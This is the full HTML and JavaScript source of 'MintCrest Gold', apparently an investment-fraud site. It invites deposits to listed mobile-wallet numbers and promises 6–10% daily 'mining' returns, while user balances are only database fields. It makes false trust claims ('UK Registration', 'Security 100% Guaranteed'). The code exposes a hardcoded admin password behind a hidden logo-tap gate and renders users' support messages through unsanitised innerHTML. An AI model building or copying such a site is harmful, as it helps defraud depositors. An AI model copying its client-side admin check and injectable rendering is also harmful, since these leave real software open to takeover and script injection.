<html lang="en" id="main-html" class="dark">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
    <title>MintCrest Gold | Official Node</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;700;800&display=swap');
        :root { --bg: #010409; --card: #0d1117; --text: #f0f6fc; --border: #30363d; --accent: #3b82f6; }
        body { font-family: 'Plus Jakarta Sans', sans-serif; background: var(--bg); color: var(--text); padding-bottom: 110px; overflow-x: hidden; }
        .glass { background: var(--card); border: 1px solid var(--border); }
        .page { display: none; animation: slideUp 0.4s ease forwards; }
        .active-page { display: block; }
        @keyframes slideUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
        .btn-prime { background: linear-gradient(135deg, #1e40af, #3b82f6); color: white; border-radius: 16px; font-weight: 800; }
        input, textarea, select { background: var(--card); border: 1px solid var(--border); color: var(--text); padding: 14px; border-radius: 14px; width: 100%; outline: none; margin-bottom: 10px; }
        .animate-marquee { display: inline-block; animation: marquee 20s linear infinite; white-space: nowrap; }
        @keyframes marquee { 0% { transform: translateX(100%); } 100% { transform: translateX(-100%); } }
    </style>
</head>
<body>

    <header class="sticky top-0 z-[5000] bg-[var(--bg)]/80 backdrop-blur-md border-b border-[var(--border)]">
        <div class="p-4 flex justify-between items-center">
            <div class="flex items-center gap-2">
                <div onclick="adminTap()" class="w-10 h-10 bg-blue-600 rounded-2xl flex items-center justify-center font-black text-white italic shadow-lg cursor-pointer">M</div>
                <div>
                    <h1 class="text-[12px] font-black uppercase tracking-tighter">MintCrest <span class="text-blue-500">Gold</span></h1>
                    <p class="text-[7px] font-bold opacity-40 uppercase">V4.0 Trusted Node</p>
                </div>
            </div>
            <div class="flex items-center gap-2">
                <div id="top-bal" class="text-[11px] font-black bg-blue-600/10 text-blue-500 px-4 py-1.5 rounded-full border border-blue-500/20 italic">₨ 0</div>
                <button onclick="logout()" class="w-9 h-9 glass rounded-xl flex items-center justify-center text-sm">🚪</button>
            </div>
        </div>
        <div class="bg-blue-600/5 py-1 border-t border-white/5 overflow-hidden">
            <p id="v-news" class="animate-marquee text-[9px] font-bold uppercase text-blue-400">Welcome sweetie! 25+ Mining Nodes active. Withdrawals: 2-24 hours. Invest & Earn! 😘</p>
        </div>
    </header>

    <main id="app-ui" class="p-4 space-y-6">
        
        <div id="p-home" class="page active-page space-y-6">
            <div class="p-8 rounded-[3rem] bg-gradient-to-br from-blue-700 to-blue-900 text-white shadow-2xl relative overflow-hidden">
                <p class="text-[10px] font-black uppercase opacity-60">Mining Balance</p>
                <h2 class="text-5xl font-black tracking-tighter my-1" id="v-bal">₨ 0.00</h2>
                <div class="flex items-center gap-2 mt-4 bg-black/20 p-3 rounded-2xl backdrop-blur-sm border border-white/5">
                    <span class="text-[8px] font-black uppercase text-blue-200">Next Yield:</span>
                    <span id="v-timer" class="text-xs font-black tracking-tighter">--:--:--</span>
                </div>
                <button onclick="claimDaily()" class="mt-4 w-full bg-white text-blue-900 p-3.5 rounded-2xl text-[10px] font-black uppercase shadow-xl active:scale-95 transition-all">🎁 Claim Daily Login Bonus</button>
            </div>

            <div class="glass p-5 rounded-[2.5rem] space-y-3">
                <p class="text-[8px] font-black text-blue-500 uppercase tracking-widest pl-2">Admin Promo Center</p>
                <div class="flex gap-2">
                    <input type="text" id="promo-input" placeholder="Promo Code" class="flex-1 !m-0 !p-4 uppercase text-xs font-black tracking-widest">
                    <button onclick="applyPromo()" class="btn-prime px-8 text-[10px] uppercase font-black">Redeem</button>
                </div>
            </div>

            <h3 class="text-[11px] font-black uppercase italic text-blue-500 px-2">Active Mining Nodes</h3>
            <div id="plans-grid" class="grid grid-cols-1 gap-4 pb-20"></div>
        </div>

        <div id="p-deposit" class="page space-y-6">
            <div class="glass p-6 rounded-[3rem] space-y-4 shadow-2xl">
                <h3 class="text-[11px] font-black uppercase text-center opacity-40">Payment Details</h3>
                <div class="space-y-3">
                    <div class="p-4 bg-blue-600/10 border border-blue-500/20 rounded-2xl">
                        <p class="text-[9px] font-black text-blue-500 uppercase">JazzCash / SadaPay</p>
                        <p class="text-lg font-black tracking-tighter">03705519562</p>
                    </div>
                    <div class="p-4 bg-green-600/10 border border-green-500/20 rounded-2xl">
                        <p class="text-[9px] font-black text-green-500 uppercase">EasyPaisa</p>
                        <p class="text-lg font-black tracking-tighter">03379827882</p>
                    </div>
                </div>
                <input type="number" id="dep-amt" placeholder="Enter Amount (₨)">
                <input type="text" id="dep-tid" placeholder="Transaction ID (TID)">
                <button onclick="sendDeposit()" class="w-full p-4 btn-prime text-[11px] uppercase tracking-widest shadow-lg shadow-blue-500/20">Submit Deposit ⚡</button>
            </div>
        </div>

        <div id="p-withdraw" class="page space-y-6">
            <div class="glass p-8 rounded-[3rem] space-y-5">
                <h3 class="text-xl font-black text-blue-500 italic text-center uppercase">Extraction</h3>
                <input type="number" id="wit-amt" placeholder="Minimum: ₨ 500">
                <select id="wit-method">
                    <option value="JazzCash">JazzCash</option>
                    <option value="EasyPaisa">EasyPaisa</option>
                    <option value="SadaPay">SadaPay</option>
                </select>
                <input type="text" id="wit-acc" placeholder="Account Number">
                <button onclick="sendWithdraw()" class="w-full p-4 btn-prime text-[11px] uppercase tracking-widest">Withdraw Funds 💸</button>
            </div>
        </div>

        <div id="p-support" class="page space-y-6">
            <div class="glass p-6 rounded-[3rem] space-y-4">
                <p class="text-[10px] font-black uppercase text-blue-500 text-center tracking-widest">Direct Admin Support</p>
                <textarea id="support-msg" placeholder="Write message to admin sweetie..." rows="4"></textarea>
                <button onclick="sendSupport()" class="w-full p-5 btn-prime text-[11px] uppercase tracking-widest">Send Message ✉️</button>
            </div>
            <div class="glass p-8 rounded-[3rem] text-[10px] opacity-80 font-bold leading-loose">
                <h4 class="text-blue-500 font-black uppercase italic">MintCrest Gold Trust</h4>
                <p>UK Registration: #UK-MCG-2026. <br>
                Official Support: webhub262@gmail.com <br>
                All mining activities are monitored. Security 100% Guaranteed.</p>
            </div>
        </div>
    </main>

    <nav class="fixed bottom-0 w-full glass border-t border-[var(--border)] p-5 flex justify-around items-center rounded-t-[3rem] z-[4000] shadow-2xl">
        <button onclick="changePage('home')" class="flex flex-col items-center gap-1.5 active:scale-75 transition-all">🏠<span class="text-[8px] font-black uppercase opacity-40">Home</span></button>
        <button onclick="changePage('deposit')" class="flex flex-col items-center gap-1.5 active:scale-75 transition-all">➕<span class="text-[8px] font-black uppercase opacity-40">Fund</span></button>
        <button onclick="changePage('withdraw')" class="flex flex-col items-center gap-1.5 active:scale-75 transition-all">💸<span class="text-[8px] font-black uppercase opacity-40">Extra</span></button>
        <button onclick="changePage('support')" class="flex flex-col items-center gap-1.5 active:scale-75 transition-all">🛡️<span class="text-[8px] font-black uppercase opacity-40">Legal</span></button>
    </nav>

    <div id="admin-ui" class="fixed inset-0 bg-[#010409] z-[100000] hidden overflow-y-auto p-6">
        <div class="flex justify-between items-center mb-8">
            <h2 class="text-2xl font-black text-blue-500 italic uppercase">Admin Node</h2>
            <button onclick="closeAdmin()" class="bg-red-600 px-6 py-2 rounded-xl text-[11px] font-black">EXIT</button>
        </div>
        <div class="glass p-6 rounded-[2.5rem] space-y-4 mb-8">
            <h4 class="text-[10px] font-black text-blue-400 uppercase">Create New Mining Plan</h4>
            <input type="text" id="new-p-name" placeholder="Plan Name">
            <input type="number" id="new-p-price" placeholder="Price (₨)">
            <input type="number" id="new-p-profit" placeholder="Daily Profit (%)">
            <input type="number" id="new-p-days" placeholder="Duration (Days)">
            <button onclick="createNewPlan()" class="w-full btn-prime p-4 text-[11px] uppercase">Add Live Plan 🚀</button>
        </div>
        <div class="glass p-6 rounded-[2.5rem] space-y-4">
            <input type="text" id="set-promo-code" placeholder="Promo Code">
            <input type="number" id="set-promo-amt" placeholder="Promo Bonus (₨)">
            <input type="number" id="set-daily-amt" placeholder="Daily Bonus (₨)">
            <button onclick="updateSettings()" class="w-full btn-prime p-4 text-[11px] uppercase">Update Settings</button>
        </div>
        <div id="adm-msg-list" class="mt-8 space-y-4 pb-10"></div>
    </div>

    <script>
        // Updated Firebase Config
        const firebaseConfig = { 
          apiKey: "AIzaSyDt3ChZHyDdtM4Ir1oXRZJUywcOiV30Wtg", 
          authDomain: "investment-84f4e.firebaseapp.com", 
          projectId: "investment-84f4e", 
          storageBucket: "investment-84f4e.firebasestorage.app", 
          messagingSenderId: "975293889308", 
          appId: "1:975293889308:web:6d034a99cc966c75ff58d9" 
        };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.firestore();
        let user = null; let system = {}; let tapCount = 0;

        function enterApp(n) {
            db.collection("users").doc(n).onSnapshot(d => {
                if(!d.exists) return; user = d.data();
                document.getElementById('v-bal').innerText = "₨ " + (user.balance || 0).toLocaleString();
                document.getElementById('top-bal').innerText = "₨ " + (user.balance || 0).toLocaleString();
                if(user.purchaseTime) startTimer(user.purchaseTime);
            });
            db.collection("settings").doc("system").onSnapshot(d => { system = d.data() || {}; });
            syncPlans();
        }

        async function syncPlans() {
            db.collection("plans").orderBy("price", "asc").onSnapshot(s => {
                const grid = document.getElementById('plans-grid'); grid.innerHTML = '';
                if(s.empty) { generateDefaultPlans(); return; }
                s.forEach(doc => {
                    const p = doc.data();
                    const dailyProfit = (p.price * (p.profit / 100)).toFixed(2);
                    const totalProfit = (p.price * (p.profit / 100) * p.days).toLocaleString();
                    grid.innerHTML += `
                    <div class="glass p-6 rounded-[2.5rem] border-l-4 border-blue-500 shadow-xl">
                        <div class="flex justify-between items-start">
                            <div>
                                <h4 class="font-black text-[10px] uppercase text-blue-500 italic">${p.name}</h4>
                                <h3 class="text-2xl font-black">₨ ${p.price.toLocaleString()}</h3>
                            </div>
                            <div class="text-right">
                                <span class="bg-blue-600/10 text-blue-500 px-4 py-1.5 rounded-full text-[9px] font-black">${p.profit}% DAILY</span>
                                <p class="text-[7px] font-bold opacity-40 mt-1 uppercase">${p.days} Days Cycle</p>
                            </div>
                        </div>
                        <div class="mt-6 pt-5 border-t border-white/5 flex justify-between items-end">
                            <div><p class="text-[7px] font-black opacity-30 uppercase">Total Profit Estimate</p><p class="text-[10px] font-black text-blue-400 italic">₨ ${totalProfit}</p></div>
                            <button onclick="buyNode('${doc.id}', ${p.price})" class="btn-prime px-8 py-3 text-[9px] uppercase tracking-widest shadow-lg shadow-blue-500/20">Activate</button>
                        </div>
                    </div>`;
                });
            });
        }

        async function createNewPlan() {
            const n = document.getElementById('new-p-name').value;
            const p = parseInt(document.getElementById('new-p-price').value);
            const pr = parseFloat(document.getElementById('new-p-profit').value);
            const d = parseInt(document.getElementById('new-p-days').value);
            if(!n || !p) return alert("Puri details bharo sweetie! 😘");
            await db.collection("plans").add({ name: n, price: p, profit: pr, days: d });
            alert("New Plan Added! 🚀");
        }

        async function updateSettings() {
            const pc = document.getElementById('set-promo-code').value.toUpperCase();
            const pa = parseInt(document.getElementById('set-promo-amt').value);
            const da = parseInt(document.getElementById('set-daily-amt').value);
            await db.collection("settings").doc("system").set({ activePromoCode: pc, promoAmt: pa, dailyBonusAmt: da }, { merge: true });
            alert("Global Settings Updated! 😘");
        }

        async function buyNode(id, price) {
            if(user.balance < price) return alert("Balance kam hai sweetie, deposit karein! 😘");
            await db.collection("users").doc(user.name).update({
                balance: firebase.firestore.FieldValue.increment(-price),
                purchaseTime: Date.now(),
                activeNodeId: id
            });
            alert("Mining Node Active! 🚀");
        }

        async function claimDaily() {
            const now = Date.now();
            if(user.lastDaily && (now - user.lastDaily < 86400000)) return alert("24 hours ka wait karein! 😘");
            await db.collection("users").doc(user.name).update({
                balance: firebase.firestore.FieldValue.increment(system.dailyBonusAmt || 10),
                lastDaily: now
            });
            alert("Daily Bonus Added! 😘");
        }

        async function applyPromo() {
            const c = document.getElementById('promo-input').value.trim().toUpperCase();
            if(c === system.activePromoCode) {
                if(user.usedPromos && user.usedPromos.includes(c)) return alert("Already Used! 😘");
                await db.collection("users").doc(user.name).update({
                    balance: firebase.firestore.FieldValue.increment(system.promoAmt || 50),
                    usedPromos: firebase.firestore.FieldValue.arrayUnion(c)
                });
                alert("Promo Applied! 😘");
                document.getElementById('promo-input').value = '';
            } else { alert("Invalid Code! 😘"); }
        }

        async function sendDeposit() {
            const a = document.getElementById('dep-amt').value;
            const t = document.getElementById('dep-tid').value;
            if(!a || !t) return alert("TID and Amount are required! 😘");
            await db.collection("deposits").add({ user: user.name, amount: a, tid: t, time: Date.now(), status: "pending" });
            alert("Deposit Request Sent! 😘");
        }

        async function sendWithdraw() {
            const a = parseInt(document.getElementById('wit-amt').value);
            if(a < 500) return alert("Minimum withdrawal is ₨ 500! 😘");
            if(user.balance < a) return alert("Not enough balance! 😘");
            await db.collection("withdraws").add({ user: user.name, amount: a, method: document.getElementById('wit-method').value, acc: document.getElementById('wit-acc').value, time: Date.now(), status: "pending" });
            alert("Withdrawal submitted! 😘");
        }

        async function sendSupport() {
            const m = document.getElementById('support-msg').value;
            if(!m) return alert("Message likho sweetie! 😘");
            await db.collection("support").add({ user: user.name, message: m, time: Date.now() });
            alert("Admin ko bhej diya! 😘");
            document.getElementById('support-msg').value = '';
        }

        function startTimer(st) {
            setInterval(() => {
                const diff = (st + 86400000) - Date.now();
                if(diff <= 0) { document.getElementById('v-timer').innerText = "YIELD READY! ⚡"; }
                else {
                    const h = Math.floor(diff/3600000); const m = Math.floor((diff%3600000)/60000); const s = Math.floor((diff%60000)/1000);
                    document.getElementById('v-timer').innerText = `${String(h).padStart(2,'0')}:${String(m).padStart(2,'0')}:${String(s).padStart(2,'0')}`;
                }
            }, 1000);
        }

        async function generateDefaultPlans() {
            for(let i=1; i<=25; i++) {
                let p = 200 + (i * 500);
                await db.collection("plans").add({ name: `Node Standard v${i}`, price: p, profit: (i < 12 ? 6 : 10), days: 30 });
            }
        }

        function adminTap() { tapCount++; if(tapCount >= 5) { if(prompt("God Key:")==="mint786") { document.getElementById('admin-ui').classList.remove('hidden'); syncMessages(); } tapCount=0; } }
        function syncMessages() {
            db.collection("support").orderBy("time", "desc").onSnapshot(s => {
                const list = document.getElementById('adm-msg-list'); list.innerHTML = '';
                s.forEach(doc => { list.innerHTML += `<div class="glass p-4 rounded-2xl border-l-4 border-blue-500 mb-2"><p class="text-[8px] font-black opacity-40">@${doc.data().user}</p><p class="text-[10px] font-bold mt-1">${doc.data().message}</p></div>`; });
            });
        }

        function changePage(p) { document.querySelectorAll('.page').forEach(pg=>pg.classList.remove('active-page')); document.getElementById('p-'+p).classList.add('active-page'); window.scrollTo(0,0); }
        function closeAdmin() { document.getElementById('admin-ui').classList.add('hidden'); }
        function logout() { localStorage.removeItem('mc_user'); location.reload(); }
        window.onload = () => { if(localStorage.getItem('mc_user')) enterApp(localStorage.getItem('mc_user')); }
    </script>
</body>
</html>
